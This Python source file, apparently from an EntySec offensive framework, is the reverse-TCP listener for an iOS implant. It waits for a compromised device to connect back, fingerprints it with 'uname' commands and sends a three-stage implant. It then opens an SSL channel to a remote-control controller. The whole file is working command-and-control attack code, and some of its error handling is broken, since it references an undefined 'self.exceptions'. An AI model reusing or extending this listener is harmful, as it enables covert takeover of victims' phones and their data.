#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import socket
import sys
import os
import ssl

from core.badges import badges

from data.exploit.ios.ac1d.reverse_tcp.core.handler import handler

class listener:
    def __init__(self):
        self.badges = badges()
        self.handler = handler()

    def stop(self):
        server.stop()

    def listen(self, local_host, local_port):
        global server
        self.handler.generate_keys()
        self.badges.output_process("Binding to " + local_host + ":" + str(local_port) + "...")
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((local_host, local_port))
            server.listen(1)
        except:
            self.badges.output_error("Failed to bind to " + local_host + ":" + str(local_port) + "!")
            raise self.exceptions.LocalException

        try:
            self.badges.output_process("Listening on port " + str(local_port) + "...")
            client, address = server.accept()
            self.badges.output_process("Connecting to " + address[0] + "...")

            client.send("uname -p\n".encode())
            device_arch = client.recv(128).decode().strip()
            client.send("uname -s\n".encode())
            device_os = client.recv(128).decode().strip()

            if device_os != "Darwin" and device_arch not in ['arm64', 'arm', 'armv7']:
                self.badges.output_error("Unsupported system!")
                raise self.exceptions.GlobalException

            self.badges.output_process("Sending iOS implant...")
            try:
                from data.exploit.ios.ac1d.reverse_tcp.core.stages import stages
                stages = stages(client)
                stages.send_stage1()
                stages.send_stage2()
                stages.send_stage3()
                client.close()
            except:
                self.badges.output_error("Failed to send iOS implant!")
                raise self.exceptions.GlobalException

            self.badges.output_process("Establishing connection...")
            try:
                client, address = server.accept()
                server.settimeout(5)
                ssl_server = ssl.wrap_socket(client, server_side=True, certfile=".keys/server.crt", keyfile=".keys/server.key", ssl_version=ssl.PROTOCOL_SSLv23)
            except ssl.SSLError as e:
                print(self.badges.E + "SSL error: " + str(e) + "!")
                server.close()
                raise self.exceptions.GlobalException
            except Exception as e:
                print(self.badges.E + "Error: " + str(e) + "!")
                server.close()
                raise self.exceptions.GlobalException

            from data.exploit.ios.ac1d.reverse_tcp.core.controller import controller
            controller = controller(ssl_server)

            del server
            return controller
        except:
            server.close()
            raise self.exceptions.GlobalException